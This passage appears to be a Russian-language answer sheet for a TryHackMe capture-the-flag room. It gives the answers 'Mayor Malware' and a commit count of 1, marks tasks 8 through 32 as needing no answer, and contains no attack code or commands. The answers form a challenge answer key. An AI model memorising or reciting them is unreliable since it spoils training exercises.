```commandline
Mayor Malware
```
Каково количество коммитов в репозитории GitHub, где была поднята проблема?
```commandline
1
```
Если вам понравилось это задание, не стесняйтесь заглянуть в комнату OPSEC!
```commandline
Ответ не нужен
```
Что со всеми этими репозиториями GitHub? Могут ли они скрывать что-то еще?
```commandline
Ответ не нужен
```

## Задание 8

```commandline
Ответ не нужен
```

## Задание 9

```commandline
Ответ не нужен
```

## Задание 10

```commandline
Ответ не нужен
```
## Задание 11

```commandline
Ответ не нужен
```

## Задание 12

```commandline
Ответ не нужен
```

## Задание 13

```commandline
Ответ не нужен
```

## Задание 14

```commandline
Ответ не нужен
```

## Задание 15

```commandline
Ответ не нужен
```
## Задание 16

```commandline
Ответ не нужен
```

## Задание 17

```commandline
Ответ не нужен
```

## Задание 18

```commandline
Ответ не нужен
```

## Задание 19

```commandline
Ответ не нужен
```

## Задание 20

```commandline
Ответ не нужен
```
## Задание 21

```commandline
Ответ не нужен
```

## Задание 22

```commandline
Ответ не нужен
```

## Задание 23

```commandline
Ответ не нужен
```

## Задание 24

```commandline
Ответ не нужен
```

## Задание 25

```commandline
Ответ не нужен
```
## Задание 26

```commandline
Ответ не нужен
```

## Задание 27

```commandline
Ответ не нужен
```

## Задание 28

```commandline
Ответ не нужен
```

## Задание 29

```commandline
Ответ не нужен
```

## Задание 30

```commandline
Ответ не нужен
```
## Задание 31

```commandline
Ответ не нужен
```

## Задание 32

```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)